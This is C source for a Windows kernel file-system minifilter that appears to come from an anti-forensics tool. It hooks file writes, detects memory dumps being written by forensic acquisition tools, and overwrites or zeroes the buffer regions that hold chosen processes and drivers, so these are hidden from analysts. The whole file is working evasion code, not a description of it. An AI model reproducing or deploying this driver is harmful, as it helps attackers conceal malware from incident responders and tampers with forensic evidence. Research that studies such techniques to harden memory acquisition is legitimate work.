#include "FileMonitor.h"
#include "FileMonitorPrivateIncludes.h"
#include "../DementiaKM/SymbolEngine.h"
#include "ForensicAppDumpDetectorFS.h"
#include "../DementiaKM/SortedList.h"
#include "../DementiaKM/CrashDumpDetector.h"
#include "../DementiaKM/ProcessHider.h"
#include "../DementiaKM/DriverHider.h"
#include "../DementiaKM/HideEntry.h"
#include <ntstrsafe.h>

// boolean representing status of HookEngine
static BOOLEAN bIsFileMonitorInitialized = FALSE;

// flag which represents the state of internal symbols and lists (dump handles list, etc).
static BOOLEAN bAreListsInitialized = FALSE;

// there is a possibility for multiple forensic applications (i.e. memory acquisition tools) to be started at the same time
// in order to handle such situation, all file object pointers that represent memory dump files will be stored in a singly-linked list for
// faster retreival
static NPAGED_LOOKASIDE_LIST DumpFileObjectsLookasideList;

// the head of the file object list
static LIST_ENTRY DumpFileObjectsListHead;

// mutex which will protect accesses to handles list
static FAST_MUTEX DumpFileObjectsListMutex;

// list which will contain all addresses/blocks that need to be hidden
static SORTED_LIST HideList;

// array containing all target object types
static TARGET_OBJECT_TYPE *pTargetTypes = NULL;

// size of the previous array
static ULONG uTargetTypesArraySize = 0;

BOOLEAN FmpGetFilePath(const IN PFLT_CALLBACK_DATA, OUT PUNICODE_STRING);
NTSTATUS FmpGetFilePathInternal(const IN PFLT_CALLBACK_DATA, const IN FLT_FILE_NAME_OPTIONS, OUT PUNICODE_STRING);
BOOLEAN FmpAddTargetObjects(const IN PTARGET_OBJECT, const ULONG);
BOOLEAN FmpAddDumpFileObject(const IN PFILE_OBJECT, const IN BOOLEAN);
BOOLEAN FmpIsDumpFileObject(const IN PFILE_OBJECT, OUT PULONG_PTR, OUT PBOOLEAN);
BOOLEAN FmpSetDumpFileOffset(const IN PFILE_OBJECT, const IN ULONG_PTR);
BOOLEAN FmpFindAndRemoveDumpFileObject(IN PFILE_OBJECT);
PDUMPFILE_ENTRY FmpGetDumpFileEntry(const IN PFILE_OBJECT);
BOOLEAN FmpPopulateHideList(IN OUT PSORTED_LIST);
BOOLEAN FmpHideObjects(const IN PFILE_OBJECT, IN OUT PVOID, IN const ULONG, const IN ULONG_PTR, const IN BOOLEAN);
VOID FmpReplaceMemory(IN OUT PVOID, const IN PVOID, const IN ULONG);
VOID FmpClearBuffer(IN OUT PVOID, const IN ULONG);
VOID FmpHideListEntryCleanup(IN PSORTED_LIST_ENTRY);

NTSTATUS FmInit(VOID)
{
	KeEnterCriticalRegion();

	// initialize symbol engine if it isn't already initialized
	if(!SymIsInitialized())
	{
		SymInit();
	}

	if(bIsFileMonitorInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return STATUS_SUCCESS;
	}

	// maybe return value should be checked
	FddInit();

	if(!NT_SUCCESS(CddInit()))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the crash dump detector failed -- if a crash dump is generated it will not be valid!\n"));
	}

	if(!NT_SUCCESS(PhInit()))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the process hider failed -- processes won't be hidden!\n"));
	}

	if(!NT_SUCCESS(DhInit()))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the driver hider failed -- drivers won't be hidden!\n"));
	}

	// creating sorted list which will contain all addresses/block that need to be hidden
	if(!NT_SUCCESS(SortedListCreate(&HideList, sizeof(HIDE_ADDRESS_ENTRY), NonPagedPool, TAG_HIDE_LIST, TRUE, FmpHideListEntryCleanup)))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the hide list failed! Cannot enumerate addresses for hiding...\n"));
		DhUnInit();
		PhUnInit();
		CddUnInit();
		FddUnInit();
		KeLeaveCriticalRegion();
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	bIsFileMonitorInitialized = TRUE;
	KeLeaveCriticalRegion();

	return STATUS_SUCCESS;
}

VOID FmUnInit(VOID)
{
	ASSERTMSG("Critical region and lookaside list deletion must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);

	KeEnterCriticalRegion();
	// check if engine has been initialized
	if(bIsFileMonitorInitialized == FALSE)
	{
		KeLeaveCriticalRegion();
		return;
	}

	FddUnInit();
	CddUnInit();
	PhUnInit();
	DhUnInit();

	// delete all elements of the hide list
	SortedListDestroy(&HideList);

	// some additional memory was allocated for symbols and dump handles list
	if(bAreListsInitialized == TRUE)
	{
		// delete array of target types
		ExFreePoolWithTag(pTargetTypes, TAG_TARGET_OBJECTS_ARRAY);

		// free all entries in lookaside list
		ExDeleteNPagedLookasideList(&DumpFileObjectsLookasideList);
	}

	bIsFileMonitorInitialized = FALSE;
	bAreListsInitialized = FALSE;
	KeLeaveCriticalRegion();
}

NTSTATUS FmStartHiding(IN PTARGET_OBJECT pTargetObjectArray, IN ULONG uArraySize)
{
	ASSERTMSG("Cannot start hiding because the FileMonitor has not yet been initialized", bIsFileMonitorInitialized == TRUE);

	if(pTargetObjectArray == NULL || uArraySize == 0 || uArraySize < sizeof(TARGET_OBJECT))
	{
		KdPrint(("[DEBUG] ERROR - Cannot start hiding because invalid hide object array or size was specified!\n"));
		return STATUS_INVALID_BUFFER_SIZE;
	}

	// TODO: check return value?
	FddInitSymbols();
	PhInitSymbols();
	DhInitSymbols();

	ULONG uNumOfObjs = uArraySize / sizeof(TARGET_OBJECT);

	// allocate memory for the array of target types (used later when addresses which must be hidden are being determined)
	pTargetTypes = (TARGET_OBJECT_TYPE *) ExAllocatePoolWithTag(PagedPool, uNumOfObjs * sizeof(TARGET_OBJECT_TYPE), TAG_TARGET_OBJECTS_ARRAY);
	if(pTargetTypes == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the target type array failed!\n"));
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	RtlZeroMemory(pTargetTypes, uNumOfObjs * sizeof(TARGET_OBJECT_TYPE));

	if(!FmpAddTargetObjects(pTargetObjectArray, uNumOfObjs))
	{
		KdPrint(("[DEBUG] WARNING - Some of the target objects were not sucessfully added - hide engine will not hide these objects...\n"));
	}

	ASSERTMSG("Fast mutex must be initialized at or below DISPATCH_LEVEL", KeGetCurrentIrql() <= DISPATCH_LEVEL);

	// initialize all required data structures
	ExInitializeNPagedLookasideList(&DumpFileObjectsLookasideList,		// list to initialize
									NULL,								// allocate function - OS supplied
									NULL,								// free function - OS supplied
									0,									// flags - always zero
									sizeof(DUMPFILE_ENTRY),				// size of each entry to be allocated
									TAG_DUMP_HANDLES_LOOKASIDE,			// HanL(ookaside) tag
									0									// depth - always zero
									);
	InitializeListHead(&DumpFileObjectsListHead);
	ExInitializeFastMutex(&DumpFileObjectsListMutex);

	bAreListsInitialized = TRUE;

	return STATUS_SUCCESS;
}

FLT_PREOP_CALLBACK_STATUS FmPreWrite(IN OUT PFLT_CALLBACK_DATA Data, IN PCFLT_RELATED_OBJECTS FltObjects, OUT OPTIONAL PVOID *CompletionContext)
{
	//ASSERTMSG("File monitor must be initialized before calling write pre-operation callback", bIsFileMonitorInitialized == TRUE);
	//ASSERTMSG("File monitor objects must be created before calling write pre-operation callback", bAreListsInitialized == TRUE);

	NTSTATUS status;
	FLT_PREOP_CALLBACK_STATUS returnStatus = FLT_PREOP_SUCCESS_NO_CALLBACK;

	// if this is a FS-filter operation, just return
	if(FLT_IS_FS_FILTER_OPERATION(Data))
	{
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	// don't do anything if the monitor is not yet initialized
	if(bIsFileMonitorInitialized == FALSE || bAreListsInitialized == FALSE)
	{
		return returnStatus;
	}

	// ignore all writes from the System or Idle (!?) processes
	ULONG_PTR uPID = (ULONG_PTR) PsGetCurrentProcessId();
	if(uPID == 0 || uPID == 4)
	{
		return returnStatus;
	}

	// check if Data, Data->Iopb and RelatedObjects are NULL
	if(Data == NULL || Data->Iopb == NULL || FltObjects == NULL)
	{
		return returnStatus;
	}

	// check if we can reach our file pointer
	PFILE_OBJECT pFileObject = FltObjects->FileObject;
	if(pFileObject == NULL || !MmIsAddressValid(pFileObject))
	{
		return returnStatus;
	}

	// get buffer and length from the parameters
	ULONG uLength = Data->Iopb->Parameters.Write.Length;
	PVOID pBuffer = Data->Iopb->Parameters.Write.WriteBuffer;

	// check length and buffer - there are some write calls with NULL buffer ($LogFile and $Directory writes for example)
	if(uLength == 0 || pBuffer == NULL)
	{
		return returnStatus;
	}

	ULONG_PTR uFileOffset = 0;
	BOOLEAN bIsCrashDump = FALSE;

	UNICODE_STRING usFilePath;
	memset(&usFilePath, 0, sizeof(UNICODE_STRING));

	// get the path of the file being written
	// the function will allocate necessary memory!
	if(!FmpGetFilePath(Data, &usFilePath))
	{
		// retrieval of file path failed, just return the status
		return returnStatus;
	}

	// first check if the handle is already in the list of known handles
	if(FmpIsDumpFileObject(pFileObject, &uFileOffset, &bIsCrashDump))
	{
		FmpHideObjects(pFileObject, pBuffer, uLength, uFileOffset, bIsCrashDump);
		FmpSetDumpFileOffset(pFileObject, uFileOffset + uLength);
	}
	else if(FddIsForensicAppDumpFile(pFileObject, &usFilePath, uLength, Data->RequestorMode))
	{
		KdPrint(("[DEBUG] Found dump file -- adding to list of known handles...\n"));

		// check if this file is a crash dump and add store this info together with the file handle
		BOOLEAN bIsCrashDump = FALSE;//CddIsCrashDumpFile(FileHandle, Buffer, Length);

		FmpAddDumpFileObject(pFileObject, bIsCrashDump);
		FmpPopulateHideList(&HideList);

		// hide objects and update offset -- current offset is 0!
		FmpHideObjects(pFileObject, pBuffer, uLength, 0, bIsCrashDump);
		FmpSetDumpFileOffset(pFileObject, uLength);
	}

	// free the memory for UNICODE_STRING
	if(usFilePath.Buffer != NULL)
	{
		ExFreePoolWithTag(usFilePath.Buffer, TAG_FILE_NAME);
	}
	
	return returnStatus;
}

BOOLEAN FmpGetFilePath(const IN PFLT_CALLBACK_DATA Data, OUT PUNICODE_STRING pusFileName)
{
	ASSERTMSG("Filter data pointer cannot be empty", Data != NULL);
	ASSERTMSG("Unicode string containing file name cannot be empty!", pusFileName != NULL);
	
	BOOLEAN bIsUStringInitialized = FALSE;

	// check if caller allocated the buffer
	if(pusFileName->Length == 0 && pusFileName->Buffer == NULL)
	{
		pusFileName->Length = 0;
		// using path of 4096 chars
		pusFileName->MaximumLength = 0x1000 * sizeof(WCHAR);
		pusFileName->Buffer = (PWSTR) ExAllocatePoolWithTag(NonPagedPool, pusFileName->MaximumLength, TAG_FILE_NAME); 
		bIsUStringInitialized = TRUE;
	}

	// check if buffer is still NULL, after the allocation
	if(pusFileName->Buffer == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Cannot allocate memory for the name of the file currently being written\n"));
		return FALSE;
	}

	// get the file name information from data (normalized file name)
	NTSTATUS status = FmpGetFilePathInternal(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_ALWAYS_ALLOW_CACHE_LOOKUP, pusFileName);
	if(!NT_SUCCESS(status))
	{
		// FltGetFileNameInformation call failed, try with the opened file name
		status = FmpGetFilePathInternal(Data, FLT_FILE_NAME_OPENED | FLT_FILE_NAME_QUERY_ALWAYS_ALLOW_CACHE_LOOKUP, pusFileName);
		if(!NT_SUCCESS(status))
		{
			// release the buffer if we allocated the memory
			if(pusFileName->Buffer != NULL && bIsUStringInitialized)
			{
				ExFreePoolWithTag(pusFileName->Buffer, TAG_FILE_NAME);
			}
			return FALSE;
		}
	}

	// caller is responsible for deallocation of memory for unicode string
	return TRUE;
}

NTSTATUS FmpGetFilePathInternal(const IN PFLT_CALLBACK_DATA Data, const IN FLT_FILE_NAME_OPTIONS NameOptions, OUT PUNICODE_STRING pusFileName)
{
	ASSERTMSG("Filter data pointer cannot be empty", Data != NULL);
	ASSERTMSG("Unicode string containing file name cannot be empty!", pusFileName != NULL);
	ASSERTMSG("Unicode string buffer containing file name cannot be empty!", pusFileName->Buffer != NULL);

	PFLT_FILE_NAME_INFORMATION pFileNameInformation = NULL;
	BOOLEAN bFileNameFound = FALSE;

	// get the file name information from data (normalized file name)
	NTSTATUS status = FltGetFileNameInformation(Data, NameOptions, &pFileNameInformation );
	if(NT_SUCCESS(status))
	{
		if(pFileNameInformation->Name.Length > 0)
		{
			RtlUnicodeStringCopy(pusFileName, &pFileNameInformation->Name);
			bFileNameFound = TRUE;
		}

		// release the file name information structure if it was used
		if(pFileNameInformation != NULL)
		{
			FltReleaseFileNameInformation(pFileNameInformation);
		}
	}

	return status;
}

BOOLEAN FmpAddTargetObjects(const IN PTARGET_OBJECT pTargetObjectArray, const ULONG uNumOfObjects)
{
	ASSERTMSG("Pointer to array of target object must not be NULL", pTargetObjectArray != NULL);

	BOOLEAN bRet = TRUE;
	for(ULONG objIndex = 0; objIndex < uNumOfObjects; objIndex++)
	{
		PTARGET_OBJECT pTargetObject = &pTargetObjectArray[objIndex];

		BOOLEAN bAddFunctionRet = TRUE;
		switch(pTargetObject->type)
		{
		case PROCESS:			
			bAddFunctionRet = PhAddTargetProcess(pTargetObject);
			break;
		case DRIVER:
			{
				bAddFunctionRet = DhAddTargetDriver(pTargetObject->szObjectName);
				break;
			}
		}

		if(bAddFunctionRet)
		{
			// check if target type already exists
			BOOLEAN bExists = FALSE;
			for(ULONG uTypeIndex = 0; uTypeIndex < uTargetTypesArraySize; uTypeIndex++)
			{
				if(pTargetTypes[uTypeIndex] == pTargetObject->type)
				{
					bExists = TRUE;
					break;
				}
			}

			// if type does not exist, add it to the array
			if(!bExists)
			{
				// the size of array will ALWAYS be <= uNumOfObjects, so no worry about the overflow
				pTargetTypes[uTargetTypesArraySize] = pTargetObject->type;
				uTargetTypesArraySize++;
			}

		}

		// if any of the functions that add the target process fails, return value is also a failure
		bRet &= bAddFunctionRet;
	}

	return bRet;
}

BOOLEAN FmpAddDumpFileObject(const IN PFILE_OBJECT pFileObject, const IN BOOLEAN bIsCrashDump)
{
	ASSERTMSG("Passed file object pointer is NULL", pFileObject != NULL);

	PDUMPFILE_ENTRY pDumpFileEntry = (PDUMPFILE_ENTRY) ExAllocateFromNPagedLookasideList(&DumpFileObjectsLookasideList);
	if(pDumpFileEntry == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Not enough memory in lookaside list to allocate new dump file entry...\n"));
		return FALSE;
	}

	// add new handle to list (thread-safely)
	pDumpFileEntry->pDumpFile = pFileObject;
	pDumpFileEntry->uOffset = 0;
	pDumpFileEntry->bIsCrashDump = bIsCrashDump;

	ASSERTMSG("Fast mutex acquire/release must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpFileObjectsListMutex);
	InsertHeadList(&DumpFileObjectsListHead, &pDumpFileEntry->ListEntry);
	ExReleaseFastMutex(&DumpFileObjectsListMutex);

	return TRUE;	
}

BOOLEAN FmpIsDumpFileObject(const IN PFILE_OBJECT pFileObject, OUT PULONG_PTR puOffset, OUT PBOOLEAN pbIsCrashDump)
{
	ASSERTMSG("Passed file object pointer is NULL", pFileObject != NULL);
	ASSERTMSG("Passed pointer to file offset is NULL", puOffset != NULL);
	ASSERTMSG("Passed pointer to crash dump specifier is NULL", pbIsCrashDump != NULL);

	*puOffset = 0;
	PDUMPFILE_ENTRY pDumpFileEntry = FmpGetDumpFileEntry(pFileObject);

	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpFileObjectsListMutex);
	if(pDumpFileEntry != NULL)
	{
		*puOffset = pDumpFileEntry->uOffset;
		*pbIsCrashDump = pDumpFileEntry->bIsCrashDump;
		ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
		ExReleaseFastMutex(&DumpFileObjectsListMutex);
		return TRUE;
	}

	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpFileObjectsListMutex);
	return FALSE;
}

BOOLEAN FmpSetDumpFileOffset(const IN PFILE_OBJECT pFileObject, const IN ULONG_PTR uOffset)
{
	ASSERTMSG("Passed file object pointer is NULL", pFileObject != NULL);

	PDUMPFILE_ENTRY pDumpFileEntry = FmpGetDumpFileEntry(pFileObject);

	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpFileObjectsListMutex);
	if(pDumpFileEntry != NULL)
	{
		pDumpFileEntry->uOffset = uOffset;
		ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
		ExReleaseFastMutex(&DumpFileObjectsListMutex);
		return TRUE;
	}

	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpFileObjectsListMutex);
	return FALSE;
}

BOOLEAN FmpFindAndRemoveDumpFileObject(IN PFILE_OBJECT pFileObject)
{
	ASSERTMSG("Passed file object pointer is NULL", pFileObject != NULL);

	PDUMPFILE_ENTRY pDumpFileEntry = FmpGetDumpFileEntry(pFileObject);

	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpFileObjectsListMutex);
	if(pDumpFileEntry != NULL)
	{
		// remove the entry and free allocated memory
		RemoveEntryList(&pDumpFileEntry->ListEntry);
		ExFreeToNPagedLookasideList(&DumpFileObjectsLookasideList, pDumpFileEntry);
		ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
		ExReleaseFastMutex(&DumpFileObjectsListMutex);
		return TRUE;
	}

	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpFileObjectsListMutex);
	return FALSE;
}

PDUMPFILE_ENTRY FmpGetDumpFileEntry(const IN PFILE_OBJECT pFileObject)
{
	ASSERTMSG("Passed file object pointer is NULL", pFileObject != NULL);

	PLIST_ENTRY dumpFileListEntry = DumpFileObjectsListHead.Flink;

	// iterate through the dump file list
	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpFileObjectsListMutex);
	while(dumpFileListEntry != &DumpFileObjectsListHead)
	{
		PDUMPFILE_ENTRY pDumpFileEntry = CONTAINING_RECORD(dumpFileListEntry, DUMPFILE_ENTRY, ListEntry);
		// if this is the wanted entry
		if(pDumpFileEntry->pDumpFile == pFileObject)
		{
			// return it to the caller
			ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
			ExReleaseFastMutex(&DumpFileObjectsListMutex);
			return pDumpFileEntry;
		}

		dumpFileListEntry = dumpFileListEntry->Flink;
	}

	// wanted dump file entry is not present in the list, return NULL
	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpFileObjectsListMutex);
	return NULL;
}

BOOLEAN FmpPopulateHideList(IN OUT PSORTED_LIST pSortedList)
{
	ASSERTMSG("Pointer to sorted list of addresses cannot be NULL", pSortedList != NULL);

	BOOLEAN bRet = TRUE;

	for(ULONG objIndex = 0; objIndex < uTargetTypesArraySize; objIndex++)
	{
		switch(pTargetTypes[objIndex])
		{
		case PROCESS:
			bRet &= PhFindHideAddreses(pSortedList);
			break;
		case DRIVER:
			bRet &= DhFindHideAddreses(pSortedList);
			break;
		}
	}

	return bRet;
}

BOOLEAN FmpHideObjects(const IN PFILE_OBJECT pFileObject, IN OUT PVOID pBuffer, IN const ULONG uBufLength, const IN ULONG_PTR uOffset, const IN BOOLEAN bIsCrashDump)
{
	ASSERTMSG("Passed pointer to buffer which contains memory dump is NULL", pBuffer != NULL);

	PHIDE_ADDRESS_ENTRY pEntry = NULL;
	BOOLEAN bRet = FALSE;

	// use write lock for synchronizing access, since elements will be deleted if they're found
	ASSERTMSG("Sorted list lock acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	SortedListWriteLock(&HideList);

	// go through the list of objects that need to be hidden - the list is SORTED by physical address
	// search will exit as soon as no object has been found so-far based on the sorted physical address
	while((pEntry = (PHIDE_ADDRESS_ENTRY) SortedListGetNext(&HideList, (PSORTED_LIST_ENTRY) pEntry)) != NULL)
	{
		ULONG_PTR uAddress = (ULONG_PTR) pEntry->pPhysicalAddress;

		// fix address if the crash dump is being generated
		if(bIsCrashDump)
		{
			uAddress = uAddress;//(ULONG_PTR) CddGetFixedAddress(pFileObject, (PVOID) uAddress);
		}

		// check if address in the current list element is bigger OR EQUAL (!) than the current offset
		// if this is the case, then exit because all other list elements have addresses bigger than the offset
		if(uAddress >= uOffset + uBufLength)
		{
			break;
		}

		// check if current buffer contains the "object" specified by the list entry
		if((uAddress >= uOffset) && (uAddress < (uOffset + uBufLength)))
		{
			bRet = TRUE;

			// get relative address inside the buffer (this address is the offset inside the buffer from the current "offset"
			// in the complete memory dump file)
			ULONG_PTR uBufRelativeAddress = uAddress - uOffset;

			// perform cleaning operation depending on the type
			switch(pEntry->type)
			{
			case REPLACE:
				// using brackets for variable declaration/definition
				{

					// check if overwriting the right value -- if not, just print the warning for now
					PVOID pOldMemContents = (PVOID)((ULONG_PTR) pBuffer + uBufRelativeAddress);
					if(RtlCompareMemory(pOldMemContents, pEntry->pOldMemContents, pEntry->uSize) == pEntry->uSize)
					{
						KdPrint(("[DEBUG] Object for hiding found - replacing %d bytes at 0x%p with new value\n", pEntry->uSize, uOffset));
					}
					else
					{
						KdPrint(("[DEBUG] WARNING - value in memory different from the value in the hide list! Replacing anyway...\n"));
					}
					FmpReplaceMemory((PVOID)((ULONG_PTR) pBuffer + uBufRelativeAddress), pEntry->pNewMemContents, pEntry->uSize);
				}
				break;
			case DEL:
				// using brackets for variable declaration/definition
				{
					// make sure that data INSIDE the buffer is being deleted
					//
					// TODO:
					// there could be THEORETICAL possibility that data which will be deleted is present in multiple adjacent buffers
					// since only allocations are being deleted at the moment, this is not a concern (allocations that we will be hiding 
					// will always be within one page only), but a generic handling of this situation would definitely be nice
					ULONG uSize = pEntry->uSize;
					if(uBufRelativeAddress + uSize > uBufLength)
					{
						KdPrint(("[DEBUG] WARNING - size of block to be deleted (0x%x) is beyond the current buffer. Deleting all possible data in this buffer\n", uSize));
						uSize = uBufLength - uBufRelativeAddress;
					}

					KdPrint(("[DEBUG] Object for hiding found - deleting 0x%x bytes starting from offset 0x%p (virt. addr. 0x%p)\n", uSize, uAddress, pEntry->pVirtualAddress));
					FmpClearBuffer((PVOID)((ULONG_PTR) pBuffer + uBufRelativeAddress), uSize);
				}
				break;
			default:
				KdPrint(("[DEBUG] WARNING - Invalid hide type specified: %d\n", pEntry->type));
			}
		}
	}

	ASSERTMSG("Sorted list lock release must occur at or below DISPATCH_LEVEL", KeGetCurrentIrql() <= DISPATCH_LEVEL);
	SortedListWriteUnlock(&HideList);
	return bRet;
}

VOID FmpReplaceMemory(IN OUT PVOID pBuffer, const IN PVOID pNewMemContents, const IN ULONG uSize)
{
	ASSERTMSG("Passed pointer to buffer which contains memory dump is NULL", pBuffer != NULL);

	if(MmIsAddressValid(pBuffer))
	{
		__try
		{
			// some forensic tools guard their buffers by setting them write-only
			// check if the buffer is writable
			if(pBuffer <= MmHighestUserAddress)
			{
				ProbeForWrite(pBuffer, uSize, 4);
			}
			RtlCopyMemory(pBuffer, pNewMemContents, uSize);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint(("[DEBUG] WARNING - Cannot write buffer @ 0x%p!\n", pBuffer));
		}
	}
}

VOID FmpClearBuffer(IN OUT PVOID pBuffer, const IN ULONG uSize)
{
	ASSERTMSG("Passed pointer to buffer which contains memory dump is NULL", pBuffer != NULL);

	// zero-out specified portion of the buffer and effectively remove the object
	// TODO: implement other ways of hiding?
	if(MmIsAddressValid(pBuffer))
	{
		__try
		{
			// some forensic tools guard their buffers by setting them write-only
			// check if the buffer is writable (of course, only if the buffer is in user-mode)
			if(pBuffer <= MmHighestUserAddress)
			{
				ProbeForWrite(pBuffer, uSize, 4);
			}
			memset(pBuffer, 0, uSize);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint(("[DEBUG] WARNING - Cannot write buffer @ 0x%p, size: 0x%x\n", pBuffer, uSize));
		}
	}
}

VOID FmpHideListEntryCleanup(IN PSORTED_LIST_ENTRY pEntry)
{
	ASSERTMSG("Entry must not be NULL", pEntry != NULL);

	// check if old/new memory contents exist
	PHIDE_ADDRESS_ENTRY pHideEntry = (PHIDE_ADDRESS_ENTRY) pEntry;

	if(pHideEntry->pOldMemContents != NULL)
	{
		ExFreePoolWithTag(pHideEntry->pOldMemContents, TAG_HIDE_ARRAY);
	}

	if(pHideEntry->pNewMemContents != NULL)
	{
		ExFreePoolWithTag(pHideEntry->pNewMemContents, TAG_HIDE_ARRAY);
	}

	ExFreePoolWithTag(pEntry, TAG_HIDE_ADDRESS_ENTRY);
}